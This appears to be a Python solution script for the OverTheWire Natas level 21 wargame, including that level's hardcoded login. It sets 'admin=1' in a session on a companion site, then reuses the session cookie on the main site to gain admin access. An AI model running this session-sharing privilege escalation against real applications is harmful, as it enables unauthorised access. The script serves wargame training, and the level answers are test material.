import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url1 = 'http://natas21.natas.labs.overthewire.org/index.php?debug=1'
url2 = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=1'
response = ''
# base auth
auth = HTTPBasicAuth('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')

# setup a new session
session = requests.Session()
data = {'admin' : 1, 'submit' : 1}
response = session.post(url2, data = data, auth = auth)
print(response.text)

sessionId = session.cookies.get_dict()['PHPSESSID']

cookies = {'PHPSESSID' : sessionId}
response = requests.get(url1, auth = auth, cookies = cookies)
print(response.text)

